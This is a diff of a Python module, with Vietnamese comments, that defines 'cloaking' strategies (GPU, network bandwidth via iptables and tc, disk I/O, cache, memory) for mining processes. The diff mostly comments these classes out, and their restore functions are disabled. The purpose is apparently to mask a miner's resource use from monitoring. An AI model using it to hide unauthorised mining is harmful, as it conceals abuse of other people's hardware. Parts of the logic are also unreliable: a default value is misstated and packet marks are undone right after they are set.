@@ -331,7 +331,6 @@ class GpuCloakStrategy:
         """
         ✅ ENHANCED: Intelligent Coordinator Constructor
         Khôi phục vai trò intelligent coordinator giữa CloakCoordinator và HardwareController
-
         :param config: Cấu hình cloaking GPU (dict).
         :param logger: Logger.
         :param gpu_resource_manager: ResourceManager liên quan đến GPU (optional, for backward compat).
@@ -393,7 +392,6 @@ class GpuCloakStrategy:
         self.smart_power_scaling = config.get('smart_power_scaling', True)
         self.emergency_fallback = config.get('emergency_fallback', True)
         self.enable_multi_gpu = config.get('enable_multi_gpu', True)
-        self.enable_plugin_system = config.get('enable_plugin_system', False)
 
         self.temperature_threshold = config.get('temperature_threshold', 80)
         if self.temperature_threshold <= 0:
@@ -688,599 +686,608 @@ class GpuCloakStrategy:
 
 
 
+
+
+
+
+
+
+
+
+
 ###############################################################################
 #            NETWORK STRATEGY: NetworkCloakStrategy                           #
 ###############################################################################
 
-class NetworkCloakStrategy:
-    """
-    ✅ ENHANCED: Cloaking mạng cho comprehensive multi-strategy environment:
-      - Đánh dấu pid bằng iptables,
-      - Giới hạn băng thông (tc).
+# class NetworkCloakStrategy:
+#     """
+#     ✅ ENHANCED: Cloaking mạng cho comprehensive multi-strategy environment:
+#       - Đánh dấu pid bằng iptables,
+#       - Giới hạn băng thông (tc).
     
-    Enhanced cho comprehensive cloaking với network isolation.
-    """
+#     Enhanced cho comprehensive cloaking với network isolation.
+#     """
     
-    strategy_type = StrategyType.NETWORK
-    requires_plugin_system = False  # Network strategies execute directly
+#     strategy_type = StrategyType.NETWORK
+#     requires_plugin_system = False  # Network strategies execute directly
     
-    # ✅ NEW: Comprehensive cloaking attributes
-    is_primary_strategy = False  # Network is SECONDARY strategy
-    coordination_priority = 70  # Medium-high priority
-    resource_conflicts = []  # No direct conflicts with other strategies
-    depends_on_strategies = []  # Independent of other strategies
-    supports_concurrent_application = True  # Safe to apply with any other strategy
-    estimated_application_time_ms = 200  # iptables + tc commands ~200ms
+#     # ✅ NEW: Comprehensive cloaking attributes
+#     is_primary_strategy = False  # Network is SECONDARY strategy
+#     coordination_priority = 70  # Medium-high priority
+#     resource_conflicts = []  # No direct conflicts with other strategies
+#     depends_on_strategies = []  # Independent of other strategies
+#     supports_concurrent_application = True  # Safe to apply with any other strategy
+#     estimated_application_time_ms = 200  # iptables + tc commands ~200ms
 
-    def __init__(
-        self,
-        config: Dict[str, Any],
-        logger: logging.Logger,
-        network_resource_manager: NetworkResourceManager
-    ):
-        """
-        Khởi tạo NetworkCloakStrategy.
+#     def __init__(
+#         self,
+#         config: Dict[str, Any],
+#         logger: logging.Logger,
+#         network_resource_manager: NetworkResourceManager
+#     ):
+#         """
+#         Khởi tạo NetworkCloakStrategy.
 
-        :param config: Cấu hình cloaking Network (dict).
-        :param logger: Logger.
-        :param network_resource_manager: ResourceManager liên quan đến Network.
-        """
-        self.logger = logger
-        self.config = config
-        self.network_resource_manager = cast(Any, network_resource_manager)
+#         :param config: Cấu hình cloaking Network (dict).
+#         :param logger: Logger.
+#         :param network_resource_manager: ResourceManager liên quan đến Network.
+#         """
+#         self.logger = logger
+#         self.config = config
+#         self.network_resource_manager = cast(Any, network_resource_manager)
 
-        self.bandwidth_reduction_mbps = config.get('bandwidth_reduction_mbps', 700)
-        if self.bandwidth_reduction_mbps <= 0:
-            self.logger.warning("bandwidth_reduction_mbps không hợp lệ, mặc định=500.")
-            self.bandwidth_reduction_mbps = 700
+#         self.bandwidth_reduction_mbps = config.get('bandwidth_reduction_mbps', 700)
+#         if self.bandwidth_reduction_mbps <= 0:
+#             self.logger.warning("bandwidth_reduction_mbps không hợp lệ, mặc định=500.")
+#             self.bandwidth_reduction_mbps = 700
 
-        self.network_interface = config.get('network_interface') or "eth0"
-        self.process_marks: Dict[int, int] = {}
+#         self.network_interface = config.get('network_interface') or "eth0"
+#         self.process_marks: Dict[int, int] = {}
 
-    def apply(self, process: MiningProcess) -> bool:
-        """
-        ✅ ENHANCED: Áp dụng network cloaking với return value validation.
+#     def apply(self, process: MiningProcess) -> bool:
+#         """
+#         ✅ ENHANCED: Áp dụng network cloaking với return value validation.
         
-        :param process: Đối tượng MiningProcess.
-        :return: bool - True nếu network cloaking áp dụng thành công, False nếu thất bại
-        """
-        try:
-            pid, name = process.pid, process.name
-            mark = pid % 32768  # Dùng pid để tạo mark
+#         :param process: Đối tượng MiningProcess.
+#         :return: bool - True nếu network cloaking áp dụng thành công, False nếu thất bại
+#         """
+#         try:
+#             pid, name = process.pid, process.name
+#             mark = pid % 32768  # Dùng pid để tạo mark
 
-            ok_mark = self.network_resource_manager.mark_packets(pid, mark)
-            if not ok_mark:
-                self.logger.error(f"[Net Cloaking] Không thể MARK iptables cho PID={pid}.")
-                return False  # ✅ FAILURE: Cannot mark packets
+#             ok_mark = self.network_resource_manager.mark_packets(pid, mark)
+#             if not ok_mark:
+#                 self.logger.error(f"[Net Cloaking] Không thể MARK iptables cho PID={pid}.")
+#                 return False  # ✅ FAILURE: Cannot mark packets
 
-            ok_limit = self.network_resource_manager.limit_bandwidth(
-                self.network_interface, mark, self.bandwidth_reduction_mbps
-            )
-            if not ok_limit:
-                self.logger.error(f"[Net Cloaking] Giới hạn băng thông thất bại (iface={self.network_interface}).")
-                return False  # ✅ FAILURE: Cannot limit bandwidth
+#             ok_limit = self.network_resource_manager.limit_bandwidth(
+#                 self.network_interface, mark, self.bandwidth_reduction_mbps
+#             )
+#             if not ok_limit:
+#                 self.logger.error(f"[Net Cloaking] Giới hạn băng thông thất bại (iface={self.network_interface}).")
+#                 return False  # ✅ FAILURE: Cannot limit bandwidth
 
-            self.process_marks[pid] = mark
-            self.logger.info(f"[Net Cloaking] Limit={self.bandwidth_reduction_mbps}Mbps cho PID={pid}, iface={self.network_interface}.")
+#             self.process_marks[pid] = mark
+#             self.logger.info(f"[Net Cloaking] Limit={self.bandwidth_reduction_mbps}Mbps cho PID={pid}, iface={self.network_interface}.")
 
-            # Rollback mark_packets
-            self.network_resource_manager.unmark_packets(pid, mark)
-            return True  # ✅ SUCCESS: Network cloaking applied successfully
+#             # Rollback mark_packets
+#             self.network_resource_manager.unmark_packets(pid, mark)
+#             return True  # ✅ SUCCESS: Network cloaking applied successfully
 
-        except psutil.NoSuchProcess as e:
-            # ✅ ERROR REPORTING: Process not found error
-            error_reporter.report_error(
-                ErrorCode.PROCESS_NOT_FOUND,
-                f"Net Cloaking: Tiến trình không tồn tại: {e}",
-                ErrorSeverity.HIGH,
-                module='cloak_strategies',
-                function='NetworkCloakStrategy.apply',
-                process_id=process.pid,
-                strategy_name='Network',
-                context_data={'process_name': process.name, 'error': str(e)},
-                exception=e
-            )
-            self.logger.error(f"Net Cloaking: Tiến trình không tồn tại: {e}")
-            return False  # ✅ FAILURE: Process does not exist
-        except psutil.AccessDenied as e:
-            # ✅ ERROR REPORTING: Access denied error
-            error_reporter.report_error(
-                ErrorCode.PROCESS_ACCESS_DENIED,
-                f"Net Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
-                ErrorSeverity.HIGH,
-                module='cloak_strategies',
-                function='NetworkCloakStrategy.apply',
-                process_id=process.pid,
-                strategy_name='Network',
-                context_data={'process_name': process.name, 'error': str(e)},
-                exception=e
-            )
-            self.logger.error(f"Net Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
-            return False  # ✅ FAILURE: Access denied
-        except Exception as e:
-            # ✅ ERROR REPORTING: General strategy application failure
-            error_reporter.report_error(
-                ErrorCode.STRATEGY_APPLICATION_FAILED,
-                f"Lỗi cloaking mạng cho {process.name}(PID={process.pid}): {e}",
-                ErrorSeverity.HIGH,
-                module='cloak_strategies',
-                function='NetworkCloakStrategy.apply',
-                process_id=process.pid,
-                strategy_name='Network',
-                context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
-                exception=e
-            )
-            self.logger.error(
-                f"Lỗi cloaking mạng cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
-            )
-            return False  # ✅ FAILURE: Network cloaking failed
+#         except psutil.NoSuchProcess as e:
+#             # ✅ ERROR REPORTING: Process not found error
+#             error_reporter.report_error(
+#                 ErrorCode.PROCESS_NOT_FOUND,
+#                 f"Net Cloaking: Tiến trình không tồn tại: {e}",
+#                 ErrorSeverity.HIGH,
+#                 module='cloak_strategies',
+#                 function='NetworkCloakStrategy.apply',
+#                 process_id=process.pid,
+#                 strategy_name='Network',
+#                 context_data={'process_name': process.name, 'error': str(e)},
+#                 exception=e
+#             )
+#             self.logger.error(f"Net Cloaking: Tiến trình không tồn tại: {e}")
+#             return False  # ✅ FAILURE: Process does not exist
+#         except psutil.AccessDenied as e:
+#             # ✅ ERROR REPORTING: Access denied error
+#             error_reporter.report_error(
+#                 ErrorCode.PROCESS_ACCESS_DENIED,
+#                 f"Net Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
+#                 ErrorSeverity.HIGH,
+#                 module='cloak_strategies',
+#                 function='NetworkCloakStrategy.apply',
+#                 process_id=process.pid,
+#                 strategy_name='Network',
+#                 context_data={'process_name': process.name, 'error': str(e)},
+#                 exception=e
+#             )
+#             self.logger.error(f"Net Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
+#             return False  # ✅ FAILURE: Access denied
+#         except Exception as e:
+#             # ✅ ERROR REPORTING: General strategy application failure
+#             error_reporter.report_error(
+#                 ErrorCode.STRATEGY_APPLICATION_FAILED,
+#                 f"Lỗi cloaking mạng cho {process.name}(PID={process.pid}): {e}",
+#                 ErrorSeverity.HIGH,
+#                 module='cloak_strategies',
+#                 function='NetworkCloakStrategy.apply',
+#                 process_id=process.pid,
+#                 strategy_name='Network',
+#                 context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
+#                 exception=e
+#             )
+#             self.logger.error(
+#                 f"Lỗi cloaking mạng cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
+#             )
+#             return False  # ✅ FAILURE: Network cloaking failed
 
-    def restore(self, process: MiningProcess) -> None:
-        """
-        Khôi phục Network - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
-        """
-        self.logger.info(f"[NETWORK RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")
+#     def restore(self, process: MiningProcess) -> None:
+#         """
+#         Khôi phục Network - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
+#         """
+#         self.logger.info(f"[NETWORK RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")
 
 ###############################################################################
 #            DISK IO STRATEGY: DiskIoCloakStrategy                            #
 ###############################################################################
-class DiskIoCloakStrategy:
-    """
-    Cloaking Disk I/O (đồng bộ) qua ionice hoặc cgroup I/O (tuỳ triển khai).
+# class DiskIoCloakStrategy:
+#     """
+#     Cloaking Disk I/O (đồng bộ) qua ionice hoặc cgroup I/O (tuỳ triển khai).
     
-    Redesigned theo blueprint với direct execution.
-    """
+#     Redesigned theo blueprint với direct execution.
+#     """
     
-    strategy_type = StrategyType.DISK_IO
-    requires_plugin_system = False  # Disk I/O strategies execute directly
+#     strategy_type = StrategyType.DISK_IO
+#     requires_plugin_system = False  # Disk I/O strategies execute directly
 
-    def __init__(
-        self,
-        config: Dict[str, Any],
-        logger: logging.Logger,
-        disk_io_resource_manager: DiskIOResourceManager
-    ):
-        """
-        Khởi tạo DiskIoCloakStrategy.
+#     def __init__(
+#         self,
+#         config: Dict[str, Any],
+#         logger: logging.Logger,
+#         disk_io_resource_manager: DiskIOResourceManager
+#     ):
+#         """
+#         Khởi tạo DiskIoCloakStrategy.
 
-        :param config: Cấu hình cloaking Disk IO (dict).
-        :param logger: Logger.
-        :param disk_io_resource_manager: ResourceManager liên quan đến Disk I/O.
-        """
-        self.logger = logger
-        self.config = config
-        self.disk_io_resource_manager = cast(Any, disk_io_resource_manager)
+#         :param config: Cấu hình cloaking Disk IO (dict).
+#         :param logger: Logger.
+#         :param disk_io_resource_manager: ResourceManager liên quan đến Disk I/O.
+#         """
+#         self.logger = logger
+#         self.config = config
+#         self.disk_io_resource_manager = cast(Any, disk_io_resource_manager)
 
-        self.io_weight = config.get('io_weight', 3)
-        if not isinstance(self.io_weight, int) or not (0 <= self.io_weight <= 7):
-            self.logger.warning(f"io_weight không hợp lệ: {self.io_weight}. Mặc định=3.")
-            self.io_weight = 3
+#         self.io_weight = config.get('io_weight', 3)
+#         if not isinstance(self.io_weight, int) or not (0 <= self.io_weight <= 7):
+#             self.logger.warning(f"io_weight không hợp lệ: {self.io_weight}. Mặc định=3.")
+#             self.io_weight = 3
 
-    def apply(self, process: MiningProcess) -> bool:
-        """
-        ✅ ENHANCED: Áp dụng Disk I/O cloaking với return value validation.
+#     def apply(self, process: MiningProcess) -> bool:
+#         """
+#         ✅ ENHANCED: Áp dụng Disk I/O cloaking với return value validation.
 
-        :param process: Đối tượng MiningProcess.
-        :return: bool - True nếu Disk I/O cloaking áp dụng thành công, False nếu thất bại
-        """
-        try:
-            pid, name = process.pid, process.name
-            ok = self.disk_io_resource_manager.set_io_weight(pid, self.io_weight)
-            if ok:
-                self.logger.info(f"[DiskIO Cloaking] PID={pid}, io_weight={self.io_weight}.")
-                return True  # ✅ SUCCESS: Disk I/O cloaking applied successfully
-            else:
-                self.logger.error(f"[DiskIO Cloaking] Không thể set io_weight cho PID={pid}.")
-                return False  # ✅ FAILURE: Cannot set I/O weight
-        except psutil.NoSuchProcess as e:
-            # ✅ ERROR REPORTING: Process not found error
-            error_reporter.report_error(
-                ErrorCode.PROCESS_NOT_FOUND,
-                f"DiskIO Cloaking: Tiến trình không tồn tại: {e}",
-                ErrorSeverity.HIGH,
-                module='cloak_strategies',
-                function='DiskIoCloakStrategy.apply',
-                process_id=process.pid,
-                strategy_name='DiskIO',
-                context_data={'process_name': process.name, 'error': str(e)},
-                exception=e
-            )
-            self.logger.error(f"DiskIO Cloaking: Tiến trình không tồn tại: {e}")
-            return False  # ✅ FAILURE: Process does not exist
-        except psutil.AccessDenied as e:
-            # ✅ ERROR REPORTING: Access denied error
-            error_reporter.report_error(
-                ErrorCode.PROCESS_ACCESS_DENIED,
-                f"DiskIO Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
-                ErrorSeverity.HIGH,
-                module='cloak_strategies',
-                function='DiskIoCloakStrategy.apply',
-                process_id=process.pid,
-                strategy_name='DiskIO',
-                context_data={'process_name': process.name, 'error': str(e)},
-                exception=e
-            )
-            self.logger.error(f"DiskIO Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
-            return False  # ✅ FAILURE: Access denied
-        except Exception as e:
-            # ✅ ERROR REPORTING: General strategy application failure
-            error_reporter.report_error(
-                ErrorCode.STRATEGY_APPLICATION_FAILED,
-                f"Lỗi DiskIO Cloaking cho {process.name}(PID={process.pid}): {e}",
-                ErrorSeverity.HIGH,
-                module='cloak_strategies',
-                function='DiskIoCloakStrategy.apply',
-                process_id=process.pid,
-                strategy_name='DiskIO',
-                context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
-                exception=e
-            )
-            self.logger.error(
-                f"Lỗi DiskIO Cloaking cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
-            )
-            return False  # ✅ FAILURE: Disk I/O cloaking failed
+#         :param process: Đối tượng MiningProcess.
+#         :return: bool - True nếu Disk I/O cloaking áp dụng thành công, False nếu thất bại
+#         """
+#         try:
+#             pid, name = process.pid, process.name
+#             ok = self.disk_io_resource_manager.set_io_weight(pid, self.io_weight)
+#             if ok:
+#                 self.logger.info(f"[DiskIO Cloaking] PID={pid}, io_weight={self.io_weight}.")
+#                 return True  # ✅ SUCCESS: Disk I/O cloaking applied successfully
+#             else:
+#                 self.logger.error(f"[DiskIO Cloaking] Không thể set io_weight cho PID={pid}.")
+#                 return False  # ✅ FAILURE: Cannot set I/O weight
+#         except psutil.NoSuchProcess as e:
+#             # ✅ ERROR REPORTING: Process not found error
+#             error_reporter.report_error(
+#                 ErrorCode.PROCESS_NOT_FOUND,
+#                 f"DiskIO Cloaking: Tiến trình không tồn tại: {e}",
+#                 ErrorSeverity.HIGH,
+#                 module='cloak_strategies',
+#                 function='DiskIoCloakStrategy.apply',
+#                 process_id=process.pid,
+#                 strategy_name='DiskIO',
+#                 context_data={'process_name': process.name, 'error': str(e)},
+#                 exception=e
+#             )
+#             self.logger.error(f"DiskIO Cloaking: Tiến trình không tồn tại: {e}")
+#             return False  # ✅ FAILURE: Process does not exist
+#         except psutil.AccessDenied as e:
+#             # ✅ ERROR REPORTING: Access denied error
+#             error_reporter.report_error(
+#                 ErrorCode.PROCESS_ACCESS_DENIED,
+#                 f"DiskIO Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
+#                 ErrorSeverity.HIGH,
+#                 module='cloak_strategies',
+#                 function='DiskIoCloakStrategy.apply',
+#                 process_id=process.pid,
+#                 strategy_name='DiskIO',
+#                 context_data={'process_name': process.name, 'error': str(e)},
+#                 exception=e
+#             )
+#             self.logger.error(f"DiskIO Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
+#             return False  # ✅ FAILURE: Access denied
+#         except Exception as e:
+#             # ✅ ERROR REPORTING: General strategy application failure
+#             error_reporter.report_error(
+#                 ErrorCode.STRATEGY_APPLICATION_FAILED,
+#                 f"Lỗi DiskIO Cloaking cho {process.name}(PID={process.pid}): {e}",
+#                 ErrorSeverity.HIGH,
+#                 module='cloak_strategies',
+#                 function='DiskIoCloakStrategy.apply',
+#                 process_id=process.pid,
+#                 strategy_name='DiskIO',
+#                 context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
+#                 exception=e
+#             )
+#             self.logger.error(
+#                 f"Lỗi DiskIO Cloaking cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
+#             )
+#             return False  # ✅ FAILURE: Disk I/O cloaking failed
 
-    def restore(self, process: MiningProcess) -> None:
-        """
-        Khôi phục DiskIO - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
-        """
-        self.logger.info(f"[DISKIO RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")
+#     def restore(self, process: MiningProcess) -> None:
+#         """
+#         Khôi phục DiskIO - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
+#         """
+#         self.logger.info(f"[DISKIO RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")
 
 ###############################################################################
 #            CACHE STRATEGY: CacheCloakStrategy                               #
 ###############################################################################
-class CacheCloakStrategy:
-    """
-    Cloaking Cache (đồng bộ):
-      - Drop caches,
-      - Giới hạn cache usage.
+# class CacheCloakStrategy:
+#     """
+#     Cloaking Cache (đồng bộ):
+#       - Drop caches,
+#       - Giới hạn cache usage.
     
-    Redesigned theo blueprint với direct execution.
-    """
+#     Redesigned theo blueprint với direct execution.
+#     """
     
-    strategy_type = StrategyType.CACHE
-    requires_plugin_system = False  # Cache strategies execute directly
+#     strategy_type = StrategyType.CACHE
+#     requires_plugin_system = False  # Cache strategies execute directly
 
-    def __init__(
-        self,
-        config: Dict[str, Any],
-        logger: logging.Logger,
-        cache_resource_manager: CacheResourceManager
-    ):
-        """
-        Khởi tạo CacheCloakStrategy.
+#     def __init__(
+#         self,
+#         config: Dict[str, Any],
+#         logger: logging.Logger,
+#         cache_resource_manager: CacheResourceManager
+#     ):
+#         """
+#         Khởi tạo CacheCloakStrategy.
 
-        :param config: Cấu hình cloaking Cache (dict).
-        :param logger: Logger.
-        :param cache_resource_manager: ResourceManager liên quan đến Cache.
-        """
-        self.logger = logger
-        self.config = config
-        self.cache_resource_manager = cast(Any, cache_resource_manager)
+#         :param config: Cấu hình cloaking Cache (dict).
+#         :param logger: Logger.
+#         :param cache_resource_manager: ResourceManager liên quan đến Cache.
+#         """
+#         self.logger = logger
+#         self.config = config
+#         self.cache_resource_manager = cast(Any, cache_resource_manager)
 
-        self.cache_limit_percent = config.get('cache_limit_percent', 50)
-        if not (0 <= self.cache_limit_percent <= 100):
-            self.logger.warning(f"cache_limit_percent={self.cache_limit_percent} không hợp lệ, mặc định=50%.")
-            self.cache_limit_percent = 50
+#         self.cache_limit_percent = config.get('cache_limit_percent', 50)
+#         if not (0 <= self.cache_limit_percent <= 100):
+#             self.logger.warning(f"cache_limit_percent={self.cache_limit_percent} không hợp lệ, mặc định=50%.")
+#             self.cache_limit_percent = 50
 
-    def apply(self, process: MiningProcess) -> bool:
-        """
-        ✅ ENHANCED: Áp dụng Cache cloaking với return value validation.
+#     def apply(self, process: MiningProcess) -> bool:
+#         """
+#         ✅ ENHANCED: Áp dụng Cache cloaking với return value validation.
 
-        :param process: Đối tượng MiningProcess.
-        :return: bool - True nếu Cache cloaking áp dụng thành công, False nếu thất bại
-        """
-        try:
-            pid, name = process.pid, process.name
-            ok = self.cache_resource_manager.limit_cache_usage(self.cache_limit_percent, pid)
-            if ok:
-                self.logger.info(f"[Cache Cloaking] PID={pid}, cache_limit={self.cache_limit_percent}%.")
-                return True  # ✅ SUCCESS: Cache cloaking applied successfully
-            else:
-                self.logger.error(f"[Cache Cloaking] Không thể set cache_limit cho PID={pid}.")
-                return False  # ✅ FAILURE: Cannot set cache limit
-        except psutil.NoSuchProcess as e:
-            # ✅ ERROR REPORTING: Process not found error
-            error_reporter.report_error(
-                ErrorCode.PROCESS_NOT_FOUND,
-                f"Cache Cloaking: Tiến trình không tồn tại: {e}",
-                ErrorSeverity.HIGH,
-                module='cloak_strategies',
-                function='CacheCloakStrategy.apply',
-                process_id=process.pid,
-                strategy_name='Cache',
-                context_data={'process_name': process.name, 'error': str(e)},
-                exception=e
-            )
-            self.logger.error(f"Cache Cloaking: Tiến trình không tồn tại: {e}")
-            return False  # ✅ FAILURE: Process does not exist
-        except psutil.AccessDenied as e:
-            # ✅ ERROR REPORTING: Access denied error
-            error_reporter.report_error(
-                ErrorCode.PROCESS_ACCESS_DENIED,
-                f"Cache Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
-                ErrorSeverity.HIGH,
-                module='cloak_strategies',
-                function='CacheCloakStrategy.apply',
-                process_id=process.pid,
-                strategy_name='Cache',
-                context_data={'process_name': process.name, 'error': str(e)},
-                exception=e
-            )
-            self.logger.error(f"Cache Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
-            return False  # ✅ FAILURE: Access denied
-        except Exception as e:
-            # ✅ ERROR REPORTING: General strategy application failure
-            error_reporter.report_error(
-                ErrorCode.STRATEGY_APPLICATION_FAILED,
-                f"Lỗi Cache Cloaking cho {process.name}(PID={process.pid}): {e}",
-                ErrorSeverity.HIGH,
-                module='cloak_strategies',
-                function='CacheCloakStrategy.apply',
-                process_id=process.pid,
-                strategy_name='Cache',
-                context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
-                exception=e
-            )
-            self.logger.error(
-                f"Lỗi Cache Cloaking cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
-            )
-            return False  # ✅ FAILURE: Cache cloaking failed
+#         :param process: Đối tượng MiningProcess.
+#         :return: bool - True nếu Cache cloaking áp dụng thành công, False nếu thất bại
+#         """
+#         try:
+#             pid, name = process.pid, process.name
+#             ok = self.cache_resource_manager.limit_cache_usage(self.cache_limit_percent, pid)
+#             if ok:
+#                 self.logger.info(f"[Cache Cloaking] PID={pid}, cache_limit={self.cache_limit_percent}%.")
+#                 return True  # ✅ SUCCESS: Cache cloaking applied successfully
+#             else:
+#                 self.logger.error(f"[Cache Cloaking] Không thể set cache_limit cho PID={pid}.")
+#                 return False  # ✅ FAILURE: Cannot set cache limit
+#         except psutil.NoSuchProcess as e:
+#             # ✅ ERROR REPORTING: Process not found error
+#             error_reporter.report_error(
+#                 ErrorCode.PROCESS_NOT_FOUND,
+#                 f"Cache Cloaking: Tiến trình không tồn tại: {e}",
+#                 ErrorSeverity.HIGH,
+#                 module='cloak_strategies',
+#                 function='CacheCloakStrategy.apply',
+#                 process_id=process.pid,
+#                 strategy_name='Cache',
+#                 context_data={'process_name': process.name, 'error': str(e)},
+#                 exception=e
+#             )
+#             self.logger.error(f"Cache Cloaking: Tiến trình không tồn tại: {e}")
+#             return False  # ✅ FAILURE: Process does not exist
+#         except psutil.AccessDenied as e:
+#             # ✅ ERROR REPORTING: Access denied error
+#             error_reporter.report_error(
+#                 ErrorCode.PROCESS_ACCESS_DENIED,
+#                 f"Cache Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
+#                 ErrorSeverity.HIGH,
+#                 module='cloak_strategies',
+#                 function='CacheCloakStrategy.apply',
+#                 process_id=process.pid,
+#                 strategy_name='Cache',
+#                 context_data={'process_name': process.name, 'error': str(e)},
+#                 exception=e
+#             )
+#             self.logger.error(f"Cache Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
+#             return False  # ✅ FAILURE: Access denied
+#         except Exception as e:
+#             # ✅ ERROR REPORTING: General strategy application failure
+#             error_reporter.report_error(
+#                 ErrorCode.STRATEGY_APPLICATION_FAILED,
+#                 f"Lỗi Cache Cloaking cho {process.name}(PID={process.pid}): {e}",
+#                 ErrorSeverity.HIGH,
+#                 module='cloak_strategies',
+#                 function='CacheCloakStrategy.apply',
+#                 process_id=process.pid,
+#                 strategy_name='Cache',
+#                 context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
+#                 exception=e
+#             )
+#             self.logger.error(
+#                 f"Lỗi Cache Cloaking cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
+#             )
+#             return False  # ✅ FAILURE: Cache cloaking failed
 
-    def restore(self, process: MiningProcess) -> None:
-        """
-        Khôi phục Cache - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
-        """
-        self.logger.info(f"[CACHE RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")
+#     def restore(self, process: MiningProcess) -> None:
+#         """
+#         Khôi phục Cache - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
+#         """
+#         self.logger.info(f"[CACHE RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")
 
 ###############################################################################
 #            MEMORY STRATEGY: MemoryCloakStrategy                             #
 ###############################################################################
-class MemoryCloakStrategy:
-    """
-    Cloaking Memory (đồng bộ):
-      - Giới hạn Memory usage.
+# class MemoryCloakStrategy:
+#     """
+#     Cloaking Memory (đồng bộ):
+#       - Giới hạn Memory usage.
     
-    Redesigned theo blueprint với direct execution.
-    """
+#     Redesigned theo blueprint với direct execution.
+#     """
     
-    strategy_type = StrategyType.MEMORY
-    requires_plugin_system = False  # Memory strategies execute directly
+#     strategy_type = StrategyType.MEMORY
+#     requires_plugin_system = False  # Memory strategies execute directly
 
-    def __init__(
-        self,
-        config: Dict[str, Any],
-        logger: logging.Logger,
-        memory_resource_manager: MemoryResourceManager,
-        cache_resource_manager: CacheResourceManager
-    ):
-        """
-        Khởi tạo MemoryCloakStrategy.
+#     def __init__(
+#         self,
+#         config: Dict[str, Any],
+#         logger: logging.Logger,
+#         memory_resource_manager: MemoryResourceManager,
+#         cache_resource_manager: CacheResourceManager
+#     ):
+#         """
+#         Khởi tạo MemoryCloakStrategy.
 
-        :param config: Cấu hình cloaking Memory (dict).
-        :param logger: Logger.
-        :param memory_resource_manager: ResourceManager liên quan đến Memory.
-        :param cache_resource_manager: ResourceManager liên quan đến Cache.
-        """
-        self.logger = logger
-        self.config = config
-        self.memory_resource_manager = cast(Any, memory_resource_manager)
-        self.cache_resource_manager = cast(Any, cache_resource_manager)
+#         :param config: Cấu hình cloaking Memory (dict).
+#         :param logger: Logger.
+#         :param memory_resource_manager: ResourceManager liên quan đến Memory.
+#         :param cache_resource_manager: ResourceManager liên quan đến Cache.
+#         """
+#         self.logger = logger
+#         self.config = config
+#         self.memory_resource_manager = cast(Any, memory_resource_manager)
+#         self.cache_resource_manager = cast(Any, cache_resource_manager)
 
-        # ✅ SMART MEMORY: GPU-aware memory allocation
-        self.gpu_aware = config.get('gpu_aware', True)
-        self.smart_mode = config.get('smart_mode', True)
+#         # ✅ SMART MEMORY: GPU-aware memory allocation
+#         self.gpu_aware = config.get('gpu_aware', True)
+#         self.smart_mode = config.get('smart_mode', True)
         
-        # Dynamic memory based on process type
-        base_memory = config.get('memory_limit_mb', 6144)
-        if self.gpu_aware and self.smart_mode:
-            # Enhanced memory for GPU processes
-            self.memory_limit_mb = base_memory
-            self.logger.info(f"🧠 [SMART MEMORY] GPU-aware mode: {self.memory_limit_mb}MB allocation")
-        else:
-            self.memory_limit_mb = base_memory
+#         # Dynamic memory based on process type
+#         base_memory = config.get('memory_limit_mb', 6144)
+#         if self.gpu_aware and self.smart_mode:
+#             # Enhanced memory for GPU processes
+#             self.memory_limit_mb = base_memory
+#             self.logger.info(f"🧠 [SMART MEMORY] GPU-aware mode: {self.memory_limit_mb}MB allocation")
+#         else:
+#             self.memory_limit_mb = base_memory
             
-        if self.memory_limit_mb <= 0:
-            self.logger.warning(f"memory_limit_mb={self.memory_limit_mb} không hợp lệ, mặc định=6144.")
-            self.memory_limit_mb = 6144
+#         if self.memory_limit_mb <= 0:
+#             self.logger.warning(f"memory_limit_mb={self.memory_limit_mb} không hợp lệ, mặc định=6144.")
+#             self.memory_limit_mb = 6144
 
-    def apply(self, process: MiningProcess) -> bool:
-        """
-        ✅ ENHANCED: Áp dụng Memory cloaking với return value validation.
+#     def apply(self, process: MiningProcess) -> bool:
+#         """
+#         ✅ ENHANCED: Áp dụng Memory cloaking với return value validation.
 
-        :param process: Đối tượng MiningProcess.
